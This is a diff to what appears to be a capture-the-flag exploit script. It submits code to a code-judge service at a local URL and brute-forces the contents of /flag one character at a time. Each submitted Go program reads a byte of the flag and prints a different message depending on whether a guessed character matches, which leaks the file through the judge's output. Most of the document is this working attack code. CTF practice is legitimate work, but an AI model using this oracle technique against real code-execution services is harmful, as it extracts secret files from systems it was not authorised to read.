@@ -8,22 +8,28 @@ url = "http://localhost:12345/jobs"
 flag = ""
 
 payload = """
-use std::fs::File;
-use std::io::{Read, Seek, SeekFrom};
+package main
 
-fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let mut file = File::open("/flag")?;
-    let position = %POSITION%;
-    file.seek(SeekFrom::Start(position as u64))?;
-    let mut char_buffer = [0u8; 1];
-    file.read_exact(&mut char_buffer)?;
-    let character = char_buffer[0] as char;
-    
+import (
+    "fmt"
+    "os"
+)
+
+func main() {
+    file, _ := os.Open("/flag")
+    defer file.Close()
+
+    position := %POSITION%
+    file.Seek(int64(position), 0)
+
+    charBuffer := make([]byte, 1)
+    file.Read(charBuffer)
+    character := rune(charBuffer[0])
+
     if character == '%GUESS%' {
-        print!("Hello World!");
-        Ok(())
+        fmt.Print("Hello World!")
     } else {
-        Err("Hack for fun".into())
+        fmt.Print("Hack for fun")
     }
 }
 """
@@ -32,7 +38,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 for pos in range(42):
     for guess in '0123456789abcdefgl-{}':
         data = {
-            "language": "Rust",
+            "language": "Go",
             "problem_id": 0,
             "source_code": payload.replace("%POSITION%", str(pos)).replace("%GUESS%", guess),
         }
